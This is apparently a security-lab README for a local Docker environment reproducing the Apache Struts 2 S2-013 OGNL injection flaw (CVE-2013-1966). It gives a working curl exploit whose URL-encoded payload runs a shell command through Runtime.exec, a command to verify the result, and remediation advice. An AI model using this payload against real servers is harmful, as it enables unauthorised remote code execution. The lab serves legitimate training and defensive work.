# Apache Struts 2 S2-013 / S2-014 Include & URL Tag OGNL RCE (CVE-2013-1966)

## Overview

Apache Struts 2 versions 2.0.0 through 2.3.14.1 contain an OGNL injection vulnerability when using s:a (anchor) or s:url tags with includeParams=all or get. User-supplied URL query parameters are passed into OGNL evaluation when constructing links, granting remote code execution.

- **Service Access**: `http://localhost:8177/`
- **Default Credentials**: `Unauthenticated OGNL URL parameter`
- **Docker Shortcut**: `./lab start struts2-s2013`
- **Container Name**: `cyberlab_04_struts2_s2013`
- **RAM Footprint**: ~250M

---

## Exploitation Walkthrough

### 1. Submit OGNL Payload in URL Parameter

```bash
curl -i 'http://localhost:8177/link.action?a=%24%7B%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23req%3D%40org.apache.struts2.ServletActionContext%40getRequest%28%29%2C%23kcp%3D%40java.lang.Runtime%40getRuntime%28%29.exec%28%22touch%20%2Ftmp%2Fpwned_s2013%22%29%7D'
```

### 2. Verify File Creation

```bash
docker exec -it cyberlab_04_struts2_s2013 ls -la /tmp/pwned_s2013
```

---

## Defensive Remediation & Hardening

1. Upgrade to Apache Struts 2.3.14.2 or newer.
2. **Avoid includeParams=all in s**:
   Avoid includeParams=all in s:url and s:a JSP tags.

---

## Video Walkthroughs & Technical References

- [2024 Guide: Hacking APIs](https://www.youtube.com/watch?v=k5HZI6CfHw4)
- [Apache Struts S2-013 Advisory](https://cwiki.apache.org/confluence/display/WW/S2-013)
- [Vulhub Struts2 S2-013 Environment](https://vulhub.org/#/environments/struts2/s2-013/)
